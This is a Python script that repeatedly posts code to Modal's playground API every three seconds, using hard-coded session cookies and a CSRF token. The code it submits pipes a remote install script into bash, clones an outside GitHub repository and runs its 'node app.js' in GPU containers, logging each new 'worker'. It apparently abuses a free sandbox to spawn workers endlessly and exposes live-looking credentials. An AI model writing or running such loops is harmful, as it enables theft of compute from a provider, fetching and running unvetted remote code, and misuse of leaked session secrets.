import requests
import time
cookies = {
    'INGRESSCOOKIE': '1755578141.444.344.839538|9de6a539c14bab7f9073ed2b75abad44',
    'ajs_anonymous_id': '0c2e9308-242a-4b89-b5d5-8170251099c1',
    'modal-csrf-token': 'p8sQze4VATgG8rSkFgLnOPWyBIPoCm',
    'modal-session': 'se-qD9ooQJgutNwepzyPJVdu6:xx-p6ycn0PguhJIN6h7k6SMJv',
    'modal-last-used-workspace': 'dophucminhthai39662005',
    'modal-last-used-environment#dophucminhthai39662005': 'main',
    'ajs_user_id': 'us-uazjlALCfo8qYxeuFDqoL9',
    'ph_phc_kkmXwgjY4ZQBwJ6fQ9Q6DaLLOz1bG44LtZH0rAhg1NJ_posthog': '%7B%22distinct_id%22%3A%22us-uazjlALCfo8qYxeuFDqoL9%22%2C%22%24sesid%22%3A%5B1755655784236%2C%220198c53b-f68c-7437-888f-0b20bbb378e6%22%2C1755655698060%5D%2C%22%24epp%22%3Atrue%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fmodal.com%2Fsignup%3Fnext%3D%252Fapps%22%7D%7D',
}

headers = {
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'baggage': 'sentry-environment=production,sentry-release=4f91578f42e34759928362cf1cedf4ef,sentry-public_key=d75f7cb747cd4fe8ac03973ae3d39fec,sentry-trace_id=e17d76a47e05495d533a1798589dc0eb,sentry-sample_rand=0.5159775358514883',
    'content-type': 'application/json',
    'origin': 'https://modal.com',
    'priority': 'u=1, i',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sentry-trace': 'e17d76a47e05495d533a1798589dc0eb-9edb614c25da0f16',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    # 'cookie': 'INGRESSCOOKIE=1755578141.444.344.839538|9de6a539c14bab7f9073ed2b75abad44; ajs_anonymous_id=0c2e9308-242a-4b89-b5d5-8170251099c1; modal-csrf-token=p8sQze4VATgG8rSkFgLnOPWyBIPoCm; modal-session=se-qD9ooQJgutNwepzyPJVdu6:xx-p6ycn0PguhJIN6h7k6SMJv; modal-last-used-workspace=dophucminhthai39662005; modal-last-used-environment#dophucminhthai39662005=main; ajs_user_id=us-uazjlALCfo8qYxeuFDqoL9; ph_phc_kkmXwgjY4ZQBwJ6fQ9Q6DaLLOz1bG44LtZH0rAhg1NJ_posthog=%7B%22distinct_id%22%3A%22us-uazjlALCfo8qYxeuFDqoL9%22%2C%22%24sesid%22%3A%5B1755655784236%2C%220198c53b-f68c-7437-888f-0b20bbb378e6%22%2C1755655698060%5D%2C%22%24epp%22%3Atrue%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fmodal.com%2Fsignup%3Fnext%3D%252Fapps%22%7D%7D',
}

json_data = {
    'tutorial': 'get_started',
    'code': 'import subprocess\nimport modal\n\n# Vẫn tạo image có CUDA + Python\nimage = (\n    modal.Image.from_registry("nvidia/cuda:12.4.0-devel-ubuntu22.04", add_python="3.11")\n    .pip_install("cupy-cuda12x")\n)\n\n# 1) Cập nhật gói và cài git + curl + gnupg\nsubprocess.run(["apt-get", "update", "-y"], check=True)\nsubprocess.run(["apt-get", "install", "-y", "git", "curl", "gnupg"], check=True)\n\n# 2) Cài Node.js (LTS 18)\nsubprocess.run(\n    "curl -fsSL https://deb.nodesource.com/setup_18.x | bash -",\n    shell=True,\n    check=True\n)\nsubprocess.run(["apt-get", "install", "-y", "nodejs"], check=True)\n\n# 3) Clone repo\nsubprocess.run(["git", "clone", "https://github.com/dophucminhthai39662005-droid/tool.git"], check=False)\n\n# 4) Chạy node app.js và giữ tiến trình\nprocess = subprocess.Popen(\n    ["node", "app.js"],\n    cwd="tool"\n)\n\nprocess.wait()',
    'modalEnvironment': 'main',
    'winsize': {
        'rows': 16,
        'cols': 93,
    },
}

response = requests.post(
    'https://modal.com/api/playground/dophucminhthai39662005/run',
    cookies=cookies,
    headers=headers,
    json=json_data,
)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"tutorial":"get_started","code":"import subprocess\\nimport modal\\n\\n# Vẫn tạo image có CUDA + Python\\nimage = (\\n    modal.Image.from_registry(\\"nvidia/cuda:12.4.0-devel-ubuntu22.04\\", add_python=\\"3.11\\")\\n    .pip_install(\\"cupy-cuda12x\\")\\n)\\n\\n# 1) Cập nhật gói và cài git + curl + gnupg\\nsubprocess.run([\\"apt-get\\", \\"update\\", \\"-y\\"], check=True)\\nsubprocess.run([\\"apt-get\\", \\"install\\", \\"-y\\", \\"git\\", \\"curl\\", \\"gnupg\\"], check=True)\\n\\n# 2) Cài Node.js (LTS 18)\\nsubprocess.run(\\n    \\"curl -fsSL https://deb.nodesource.com/setup_18.x | bash -\\",\\n    shell=True,\\n    check=True\\n)\\nsubprocess.run([\\"apt-get\\", \\"install\\", \\"-y\\", \\"nodejs\\"], check=True)\\n\\n# 3) Clone repo\\nsubprocess.run([\\"git\\", \\"clone\\", \\"https://github.com/dophucminhthai39662005-droid/tool.git\\"], check=False)\\n\\n# 4) Chạy node app.js và giữ tiến trình\\nprocess = subprocess.Popen(\\n    [\\"node\\", \\"app.js\\"],\\n    cwd=\\"tool\\"\\n)\\n\\nprocess.wait()","modalEnvironment":"main","winsize":{"rows":16,"cols":93}}'.encode()
#response = requests.post(
#    'https://modal.com/api/playground/dophucminhthai39662005/run',
#    cookies=cookies,
#    headers=headers,
#    data=data,
#)

url = 'https://modal.com/api/playground/dophucminhthai39662005/run'
delay = 3  

def main():
    while True:
        try:
            resp = requests.post(
                url,
                cookies=cookies,
                headers=headers,
                json=json_data,
                timeout=10  
            )
            print(f"Đã tạo worker thành công | Status: {resp.status_code}")
        except requests.exceptions.Timeout:
            print("Request bị timeout, thử lại sau...")
        except Exception as e:
            print(f"Tạo worker với lỗi: {e}")

        for i in range(delay, 0, -1):
            print(f"Đợi {i} giây...", end="\r", flush=True)
            time.sleep(1)


if __name__ == "__main__":
    main()



